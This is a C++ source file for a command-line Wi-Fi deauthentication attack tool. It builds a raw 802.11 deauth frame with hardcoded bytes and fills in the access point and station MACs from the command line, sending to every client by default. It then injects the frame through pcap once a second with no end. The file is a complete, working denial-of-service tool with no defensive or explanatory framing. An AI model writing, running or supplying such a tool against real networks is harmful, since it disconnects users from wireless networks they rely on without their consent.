#include <cstdio>
#include <cstring>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "net-address.h"

void usage();

const int PACKET_SIZE = 38;

// Deauth packet
unsigned char deauth_packet[PACKET_SIZE+1] = 
"\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01"
"\xff\xff\xff\xff\xff\xff\x5a\x65\xe6\x79\x9b\xef\x5a\x65\xe6\x79"
"\x9b\xef\x60\x20\x07\x00";


int main(int argc, char* argv[]) {
	// check syntax
	if (argc < 3) {
		usage();
		return -1;
	}

    char *dev = argv[1];
    char *_ap_mac = argv[2];
    char *_st_mac;
    if (argc >= 4) _st_mac = argv[3];
    else _st_mac = "FF:FF:FF:FF:FF:FF";

	// open my network interface
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "Error: could not open device %s. (%s)\n", dev, errbuf);
		return -1;
	}

    MacAddr ap_mac, st_mac;
    ap_mac.set_mac_addr(_ap_mac);
    st_mac.set_mac_addr(_st_mac);

    memcpy(deauth_packet+16, st_mac.mac, 6);  // Receiver addr
    memcpy(deauth_packet+22, ap_mac.mac, 6);  // Transmitter addr
    memcpy(deauth_packet+28, ap_mac.mac, 6);  // BSSID addr

    do {
        int res = pcap_sendpacket(handle, deauth_packet, PACKET_SIZE);

        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            break;
        } else {
            printf("Sent deauth packet\n");
        }
    } while (sleep(1) == 0);

	pcap_close(handle);

	return 0;
}


void usage()
{
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}
